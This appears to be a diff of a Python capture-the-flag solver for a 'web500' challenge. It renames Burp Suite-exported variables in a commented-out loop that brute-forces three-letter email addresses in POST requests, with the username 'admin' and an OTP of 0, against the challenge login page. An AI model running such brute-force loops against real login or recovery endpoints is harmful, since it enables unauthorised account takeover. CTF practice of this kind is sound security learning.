@@ -5,15 +5,14 @@ import time
 import re
 import hashlib
 
-# burp0_url = "https://challenges.silicon-ctf.party:443/web500/index.php"
+# url = "https://challenges.silicon-ctf.party:443/web500/index.php"
 # count=1
-# # burp0_headers = {"Connection": "close", "Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "Origin": "https://challenges.silicon-ctf.party", "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Referer": "https://challenges.silicon-ctf.party/web500/index.php", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9"}
 # for email in map(''.join, itertools.product(string.ascii_lowercase, repeat=int(3))):
 #     # if count % 5 == 0:
 #     #     time.sleep(1)
 #     # print(f"Trying: {email}@localhost.com")
-#     burp0_data = {"uname": "admin", "otp": "0", "e":f"{email}@sith.com", "id":"1"}
-#     res=requests.post(burp0_url, data=burp0_data)
+#     data = {"uname": "admin", "otp": "0", "e":f"{email}@sith.com", "id":"1"}
+#     res=requests.post(url, data=data)
 #     if res.status_code != 200:
 #         print('\nRan into error - may need to slow down')
 #         break
